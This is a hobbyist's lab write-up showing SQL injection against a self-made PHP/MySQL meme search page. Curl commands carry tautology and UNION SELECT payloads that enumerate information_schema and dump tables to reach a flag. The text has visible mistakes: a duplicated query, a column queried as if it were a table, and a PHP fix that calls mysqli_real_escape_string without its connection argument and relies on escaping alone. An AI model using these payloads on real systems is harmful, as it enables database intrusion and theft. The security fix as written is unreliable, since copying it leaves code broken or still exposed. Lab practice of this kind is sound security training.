This is a writeup for a sql injection exploit for a website I made a while back. I haven't  uploaded the vm with the website, or any of the files for it yet, however I have the writeup here as a reference.

#Dankabase
The Dankabase is a mysql database that is linked to a php interface that is linked to an html input page. The html input page contains some basic security measures in place. It uses Javascript to strip away characters necessary for an sql injection attack. This interface will prove to be a rather difficult end to launch an attack. However this interface does give us two valuable pieces of knowledge. It informs us of the script that it is used to run the search query (“search.php”), and the variable it uses to send data over to the script (“Meme”). With these two pieces of info we can go ahead and construct our own interface to proceed with the attack.This can be done with an application named curl, consider it a terminal based web browser

Replace 127.0.0.1 with the VM's IP address

To start off let's just attempt to do a successful, non-offensive, Tumblr approved, gender neutral query.

```
Curl --data “Meme=Confession Bear” 127.0.0.1/search.php
```

After this you should see output. I forget what the output should be, but it should be a numerical number between 1-10. Now let’s try to attack it. The query is the one listed below.

```
$sql = “Select Dankage From carl WHERE Meme = ‘$Meme’”;
```

This query isn’t safe, and vulnerable to sql attacks. Let’s try one of the most basic attacks. Keep in mind whatever you send as the $Meme will be replace the (“$Meme”)

```
Curl --data “Meme=Leafy’ or ‘1’=’1” 127.0.0.1/search.php
```

This will display the full ever row’s dankage row. With our current query, this is all we are going to get out of this. It is time to do some database recon. We are going to list every table in the db. We can do so by doing adding a select union to our sql injection, which will display every table in the database. 

```
Curl --data “Meme=Confession Bear’ Union Select table_name from information_schema.tables#” 127.0.0.1/search.php
```

This outputs a lot of table names. Search through it however you please (manual or pipe it into a text file). You will find two oddly named tables, carl and knowledge. Carl is a running meme so it makes sense and knowledge is right next to it and neither really fit in. If you want you could always pipe it into a txt then run a diff on a file with a list of just the default table names. Now that we have identified two tables of interest, it’s time we investigated these two tables to see what columns they have. We can do that by again checking some data in INFORMATION_SCHEMA table COLUMNS. To dot that you can run the following SQL attacks.

```
Curl --data “Meme=Confession Bear’ Union Select COLUMN_NAME from information_schema.columns where TABLE_NAME=’carl’#” 127.0.0.1/search.php

Curl --data “Meme=Confession Bear’ Union Select COLUMN_NAME from information_schema.columns where TABLE_NAME=’carl’#” 127.0.0.1/search.php
```

Terminal Equivalent:
```
SELECT COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=’knowledge’;

SELECT COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=’carl’;
```

For the table knowledge we see the columns ‘id’ and ‘info’, ID is probably just the id key so info is probably the only server that stores data valuable to us. For carl we get three columns, ‘id’, ‘meme’, and ‘Dankage’. We are going to view the entire contents of each of those columns using an sql injection attack. To do so we will use the attacks listed below.

```
Curl --data “Meme=Confession Bear’ Union Select meme from carl#” 127.0.0.1/search.php
Curl --data “Meme=Confession Bear’ Union Select meme from Dankage#” 127.0.0.1/search.php
Curl --data “Meme=Confession Bear’ Union Select meme from carl’#” 127.0.0.1/search.php
```

When you run the final attack,.you see something very valuable. You get the flag! The flag is guyinactf(v@cc1n@t3_y0ur3_d@NK@b@53)

#Securing

Securing this is fairly simple. You can do so by escaping the string. This will essentially stip it of the characters necessary for an SQL Injection attack. The code to php file responsible for the query is on the next page. Essentially after your variable that you are going to use in your sql query obtains its value (which is listed below).

```
$Meme = $_POST[“Meme”];
```

You escape it, which essentially you just add the following line.

```
$Meme = mysqli_real_escape_string($Meme);
```

Now try to sql inject it.
<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3<3






















